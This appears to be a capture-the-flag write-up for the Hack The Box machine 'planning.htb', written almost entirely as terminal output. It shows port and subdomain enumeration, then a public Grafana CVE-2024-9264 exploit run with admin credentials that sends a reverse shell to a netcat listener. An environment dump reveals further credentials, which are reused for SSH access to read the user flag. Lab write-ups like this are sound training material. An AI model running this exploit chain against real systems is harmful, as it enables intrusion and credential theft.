# planning.htb

```
Hexada@hexada ~/Downloads$ sudo nmap -sS -sC -sV -p- -T5 --max-rate 10000 10.10.11.68                                                                                                 1 ↵  
[sudo] password for Hexada: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 19:58 EEST
Warning: 10.10.11.68 giving up on port because retransmission cap hit (2).
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.15s latency).
Not shown: 65321 closed tcp ports (reset), 212 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 363.55 seconds
```

```
Hexada@hexada ~/Downloads$ gobuster dir -u http://planning.htb/ -w ~/app/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 25 -x php,txt,html           
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://planning.htb/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /home/Hexada/app/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 23914]
/contact.php          (Status: 200) [Size: 10632]
/about.php            (Status: 200) [Size: 12727]
/img                  (Status: 301) [Size: 178] [--> http://planning.htb/img/]
/detail.php           (Status: 200) [Size: 13006]
/css                  (Status: 301) [Size: 178] [--> http://planning.htb/css/]
/lib                  (Status: 301) [Size: 178] [--> http://planning.htb/lib/]
/js                   (Status: 301) [Size: 178] [--> http://planning.htb/js/]
/course.php           (Status: 200) [Size: 10229]
/enroll.php           (Status: 200) [Size: 7053]
```

```
Hexada@hexada ~/Downloads$ ffuf -w /home/Hexada/app/pentesting-wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.planning.htb" -u http://planning.htb -fs 178                   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb
 :: Wordlist         : FUZZ: /home/Hexada/app/pentesting-wordlists/SecLists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 49ms]
```

![image](https://github.com/user-attachments/assets/a066f3c1-7f8a-4b7a-8a23-1cdbdae4c461)

https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit

```
Hexada@hexada ~/app/vrm/planning.htb/CVE-2024-9264$ nc -lvnp 1717
```

```
python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.16.80 --reverse-port 1717
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 1717
```

```
Hexada@hexada ~/app/vrm/planning.htb/CVE-2024-9264$ nc -lvnp 1717                                                                                                                 1 ↵ main 
Connection from 10.10.11.68:58382
sh: 0: can't access tty; job control turned off
# env   
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
OLDPWD=/root
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=ls
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTec*****
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/
```

```
Hexada@hexada ~/app/vrm/planning.htb/CVE-2024-9264$ ssh enzo@10.10.11.68                                                                                                        130 ↵ main 
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue May 27 07:47:58 PM UTC 2025

  System load:           0.0
  Usage of /:            65.0% of 6.30GB
  Memory usage:          41%
  Swap usage:            0%
  Processes:             240
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.68
  IPv6 address for eth0: dead:beef::250:56ff:fe94:46f1

  => There are 5 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue May 27 19:47:58 2025 from 10.10.16.80
enzo@planning:~$ ls
user.txt
enzo@planning:~$ cat user.txt 
d6490b4738f60764133*****
```
